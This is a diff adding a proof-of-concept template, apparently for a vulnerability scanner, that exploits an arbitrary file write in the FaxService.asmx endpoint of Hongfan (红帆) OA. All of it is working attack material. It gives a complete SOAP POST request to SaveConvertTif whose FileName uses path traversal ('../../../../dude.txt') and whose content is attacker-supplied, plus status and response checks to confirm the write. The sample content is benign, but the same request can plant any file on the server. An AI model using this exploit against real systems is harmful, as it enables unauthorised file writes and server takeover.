@@ -1,0 +1,27 @@
+﻿<DudePoc_Name>红帆 OA FaxService.asmx任意文件写入</DudePoc_Name>
+<DudePoc_Description>红帆 OA FaxService.asmx任意文件写入</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-Type: text/xml; charset=utf-8
+SOAPAction: http://tempuri.org/SaveConvertTif
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SaveConvertTif xmlns="http://tempuri.org/">
+      <FaxID>1</FaxID>
+      <Pages>2</Pages>
+      <FileName>../../../../dude.txt</FileName>
+      <FileContent>$<AttackCode>$</FileContent>
+    </SaveConvertTif>
+  </soap:Body>
+</soap:Envelope>
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>SaveConvertTifResponse</DudePoc_VerifyData>
+<DudePoc_VerifyFile>/iOffice/dude.txt</DudePoc_VerifyFile>
+<DudePoc_AttackCode>ZHVkZQ==</DudePoc_AttackCode>
